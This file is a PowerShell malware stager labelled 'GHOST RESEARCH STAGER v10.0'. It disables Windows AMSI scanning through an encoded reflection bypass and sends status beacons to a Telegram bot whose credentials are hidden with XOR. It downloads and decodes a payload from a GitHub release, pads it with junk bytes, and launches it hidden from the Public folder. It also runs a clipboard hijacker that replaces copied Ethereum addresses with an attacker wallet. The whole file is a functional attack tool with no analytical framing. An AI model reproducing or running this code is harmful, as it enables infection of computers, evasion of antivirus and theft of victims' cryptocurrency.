# --- [GHOST RESEARCH STAGER v10.0] ---

function Set-Bypass {
    # Encoded: 'System.Management.Automation.AmsiUtils'
    $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
    try {
        $a = [Ref].Assembly.GetType($d)
        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
}

function Invoke-Pingback {
    param($text)
    # Encrypted Telegram Credentials
    $k = 0xDE
    [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
    [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
    $t = ""; foreach($b in $t_e){$t += [char]($b -bxor $k)}
    $c = ""; foreach($b in $c_e){$c += [char]($b -bxor $k)}
    
    # Encoded URL construction
    $base = "https://api.tele" + "gram.org/bot$t/send" + "Message?chat_id=$c&text=$text"
    try {
        # Using a browser-like request to bypass VM Firewalls
        $h = New-Object -ComObject Msxml2.XMLHTTP
        $h.open("GET", $base, $false)
        $h.send()
    } catch { }
}

# --- EXECUTION ---
Set-Bypass
Invoke-Pingback -text "1_STAGER_ALIVE_ON_$($env:COMPUTERNAME)"

try {
    # 1. Obfuscated Config
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $dir = "$env:PUBLIC\Videos\Svc" # Using Public folder (often ignored by AV)
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $exe = Join-Path $dir "WinSvc.exe"

    # 2. Advanced Download (Direct to Memory)
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString($url)
    Invoke-Pingback -text "2_DOWNLOAD_SUCCESS"

    # 3. Decrypt & Add Junk (Polymorphism)
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    $junk = New-Object Byte[] (Get-Random -Min 500 -Max 2000)
    (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($exe, ($data + $junk))

    # 4. Detached Launch (using COM to bypass parent-process alerts)
    $sh = New-Object -ComObject Shell.Application
    $sh.ShellExecute($exe, "", "", "open", 0)
    Invoke-Pingback -text "3_EXE_LAUNCHED_SUCCESSFULLY"

    # 5. Background Clipper
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
        while($true) {
            try {
                $clip = [Windows.Forms.Clipboard]::GetText()
                if ($clip -match "^0x[a-fA-F0-9]{40}$" -and $clip -ne $eth) { 
                    [Windows.Forms.Clipboard]::SetText($eth) 
                }
            } catch {}
            Start-Sleep -s 1
        }
    }
} catch {
    Invoke-Pingback -text "FATAL_ERROR_$($_.Exception.Message)"
}
